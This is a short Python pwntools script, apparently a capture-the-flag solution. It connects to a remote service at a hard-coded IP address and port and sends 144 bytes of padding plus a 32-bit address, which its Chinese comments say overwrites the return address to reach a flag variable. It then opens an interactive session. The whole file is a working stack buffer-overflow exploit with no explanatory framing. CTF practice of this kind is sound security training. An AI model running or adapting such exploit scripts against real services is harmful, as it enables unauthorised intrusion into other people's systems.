from pwn import *

def exploit():
    r = remote("124.16.75.117", 51002)

    offset = 144 # 偏移量，填充到ret地址
    flag_addr = 0x0804a000 # flag变量地址

    payload = b"a" * offset + p32(flag_addr)

    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit()